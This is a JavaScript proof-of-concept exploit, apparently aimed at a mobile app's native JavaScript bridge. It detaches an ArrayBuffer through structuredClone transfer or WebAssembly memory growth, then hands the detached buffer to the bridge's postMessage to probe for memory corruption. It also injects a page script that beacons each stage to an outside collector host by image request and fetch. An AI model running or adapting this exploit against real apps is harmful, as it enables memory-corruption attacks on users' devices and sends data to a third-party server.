(() => {
  const base = NativeModules.get("BaseModule");
  const collector =
    "https://tiktokrcepoc.francisconeves97.com/" +
    "review-music-bridge-23dee8c4feb9dce58af189befd38254cdc2c79b71fed3f33/" +
    "worker-beacon?run=github-vmsdk-ab-20261121&event=";

  const report = event => {
    const text = String(event);
    const url = collector + encodeURIComponent(text);
    const pageScript = `(() => {
      const url = ${JSON.stringify(url)};
      try {
        const image = new Image();
        image.src = url + "&transport=image";
        window.__piaArrayBufferAuditImage = image;
      } catch (_) {}
      try {
        fetch(url + "&transport=fetch", {
          mode: "no-cors",
          cache: "no-store"
        }).catch(() => {});
      } catch (_) {}
    })()`;
    try {
      base.handleScript(pageScript);
    } catch (_) {}
  };

  report(
    "START_sc_" + typeof structuredClone + "_wasm_" + typeof WebAssembly
  );

  let buffer;
  try {
    if (typeof structuredClone === "function") {
      buffer = new ArrayBuffer(65536);
      new Uint8Array(buffer)[0] = 0x41;
      structuredClone(buffer, {transfer: [buffer]});
      report("AFTER_STRUCTURED_CLONE_len_" + buffer.byteLength);
    } else {
      const memory = new WebAssembly.Memory({initial: 1});
      buffer = memory.buffer;
      new Uint8Array(buffer)[0] = 0x41;
      memory.grow(1);
      report("AFTER_WASM_GROW_len_" + buffer.byteLength);
    }
  } catch (error) {
    report("DETACH_ERROR_" + error);
    return;
  }

  report("BEFORE_POST");
  try {
    base.postMessage({kind: "detached-arraybuffer", buffer});
    report("POST_RETURNED");
  } catch (error) {
    report("POST_ERROR_" + error);
  }

  try {
    setTimeout(() => report("ALIVE_1000"), 1000);
  } catch (error) {
    report("TIMER_ERROR_" + error);
  }
})();
